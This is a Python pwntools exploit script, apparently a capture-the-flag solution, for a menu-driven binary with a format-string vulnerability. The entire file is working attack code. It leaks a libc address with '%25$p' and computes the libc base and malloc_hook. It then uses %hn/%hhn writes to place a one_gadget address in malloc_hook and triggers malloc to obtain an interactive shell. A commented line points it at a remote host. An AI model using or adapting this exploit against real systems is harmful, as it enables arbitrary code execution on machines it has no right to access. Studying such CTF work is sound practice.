from pwn import * 

#p= remote('134.122.99.223',30190)
p = process('./bin')
#pid = gdb.attach(p,gdbscript='b * fox_bar+86\nb*drinks_menu')

def trigger_format(p,format):
    p.sendlineafter('food\n','1')
    p.sendlineafter('rocks)\n','2')

    p.sendlineafter('?\n',str(format))
#trigger_format(p,'%1111x')


trigger_format(p,'%25$p')
leak_libc = int(p.recvline().replace('\n','').ljust(8,'\0'),16)
libc_base = leak_libc -231 - 0x021ab0
malloc_hook = libc_base +0x0000000003ebc30

one_gadget1 = libc_base +0x10a45c
one_gadget2 = libc_base+ 0x4f3c2
one_gadget3 = libc_base+0x4f365

lower_2_bytes = one_gadget2 & 0xffff
third_byte = one_gadget2 & 0xff0000
third_byte = third_byte >> 16

#overwrite_payload = 'AAAA%'+str(int(third_byte))+'x%12$hhn'+'AAA%'+str(int(lower_2_bytes))+'x%13$hn'+p64(malloc_hook+2)+p64(malloc_hook)
overwrite_payload_1 = 'aaa%'+str(int(lower_2_bytes -3))+'x%10$hn'+p64(malloc_hook)
overwrite_payload_2 = 'AAAA%'+str(int(third_byte-4))+'x%10$hhn'+p64(malloc_hook+2)
print "libc_leak: "+hex(leak_libc)
print "libc_base: "+hex(libc_base)
print "malloc_hook: "+hex(malloc_hook)
print "gadgets: ",hex(one_gadget1),hex(one_gadget2),hex(one_gadget3)
print "2_spodna_byta: ",hex(lower_2_bytes),':',int(lower_2_bytes)
print "3rd byte 1: ",hex(third_byte),':',int(third_byte)

trigger_format(p,overwrite_payload_1)
trigger_format(p,overwrite_payload_2)
trigger_format(p,'%111111111x')
p.interactive()





